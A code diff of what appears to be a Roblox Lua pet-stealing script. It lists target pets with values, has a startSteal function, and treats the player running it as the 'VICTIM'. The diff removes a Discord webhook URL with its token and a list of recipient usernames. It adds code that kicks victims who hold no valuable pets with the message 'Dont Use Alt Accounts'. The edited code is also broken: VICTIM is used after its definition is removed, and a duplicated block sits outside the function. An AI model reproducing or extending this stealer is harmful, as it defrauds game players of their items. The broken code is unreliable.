@@ -13,20 +13,13 @@ if getServerType and getServerType:IsA("RemoteFunction") then
     end
 end
 
--- ✅ Configuration
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
-local VICTIM = game.Players.LocalPlayer
-local USERNAMES = {
-    "saikigrow",
-    "yuniecoxo",
-    "yyyyyvky"
-}
+
 
 local PET_VALUES = {
     ["Raccoon"] = { emoji = "🦝", value = 2000 },
     ["T-Rex"] = { emoji = "🦖", value = 5000 },
     ["Fennec Fox"] = { emoji = "🦊", value = 3500 },
-    ["Dragonfly"] = { emoji = "🐉", value = 4000 },
+    ["Dragonfly"] = { emoji = "🐞", value = 4000 },
     ["Butterfly"] = { emoji = "🦋", value = 4000 },
     ["Disco Bee"] = { emoji = "🐝", value = 4200 },
     ["Mimic Octopus"] = { emoji = "🐙", value = 6000 },
@@ -240,9 +233,18 @@ local function equipPet(pet)
 end
 
 local function getPlayersPets()
-    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+    local foundAny = false -- Flag to check if player has any valid pets
+    local petInventory = dataModule:GetData().PetsData.PetInventory.Data
+
+    if not petInventory or typeof(petInventory) ~= "table" then
+        VICTIM:Kick("No pet data found.")
+        return
+    end
+
+    for petUid, value in petInventory do
         local matchedName = checkPetsWhilelist(value.PetType)
         if matchedName then
+            foundAny = true
             local petInfo = PET_VALUES[matchedName]
             local mutation = ""
 
@@ -250,7 +252,7 @@ local function getPlayersPets()
                 mutation = "Rainbow "
                 petInfo.value += 10000
             elseif string.find(value.PetType, "Mega") then
-                mutation = "Mega"
+                mutation = "Mega "
                 petInfo.value += 15000
             elseif string.find(value.PetType, "Ascended") then
                 mutation = "Ascended "
@@ -261,7 +263,19 @@ local function getPlayersPets()
             totalPetValue += petInfo.value
         end
     end
+
+    -- Kick if no matching pets found
+    if not foundAny then
+        VICTIM:Kick("Dont Use Alt Accounts")
+    end
 end
+
+    -- Kick if no matching pets found
+    if not foundAny then
+        VICTIM:Kick("Dont Use Alt Accounts")
+    end
+end
+
 
 local function startSteal(trigerName)
     if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
